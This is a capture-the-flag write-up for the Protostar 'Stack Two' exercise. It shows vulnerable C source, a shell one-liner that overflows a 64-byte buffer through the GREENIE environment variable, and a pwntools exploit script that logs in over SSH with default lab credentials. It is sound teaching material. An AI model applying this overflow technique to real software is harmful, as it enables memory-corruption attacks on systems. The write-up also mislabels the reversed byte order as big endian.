# Stack Two

Stack2 looks at environment variables, and how they can be set.

This level is at /opt/protostar/bin/stack2

## Source Code

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  volatile int modified;
  char buffer[64];
  char *variable;

  variable = getenv("GREENIE");

  if(variable == NULL) {
      errx(1, "please set the GREENIE environment variable\n");
  }

  modified = 0;

  strcpy(buffer, variable);

  if(modified == 0x0d0a0d0a) {
      printf("you have correctly modified the variable\n");
  } else {
      printf("Try again, you got 0x%08x\n", modified);
  }

}
```

## Writeup

In this code there is a buffer of 64 element and upper that there is the modified variable.

We can set the **GREENIE** environment variable to overflow the buffer and overwrite the modified variabile by corrupting the stack.

The modified variable need to be **0x0d0a0d0a**, we can write it in **big endian** as this:

```bash
GREENIE=`python -c "print('a'*64 + '\x0a\x0d\x0a\x0d')"` /opt/protostar/bin/stack2
```

With this output:

```bash
$ GREENIE=`python -c "print('a'*64 + '\x0a\x0d\x0a\x0d')"` /opt/protostar/bin/stack2
you have correctly modified the variable
```

## Exploit

```python
#!/usr/bin/python3
from pwn import *

# Set up pwntools for the correct architecture
# exe = context.binary = ELF('stack2')

host = args.HOST or 'protostar'
port = int(args.PORT or 22)
user = args.USER or 'user'
password = args.PASSWORD or 'user'
remote_path = '/opt/protostar/bin/stack2'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell.set_working_directory(symlink=True)


def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


def remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv,
                         gdbscript=gdbscript,
                         ssh=shell,
                         *a,
                         **kw)
    else:
        return shell.run([remote_path] + argv, *a, **kw)


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
#gdbscript = '''
#break *0x{exe.symbols.main:x}
#continue
#'''.format(**locals())


payload = cyclic(64) + p32(0x0d0a0d0a)
io = start(env = {'GREENIE' : payload})
log.success(io.recvline())
```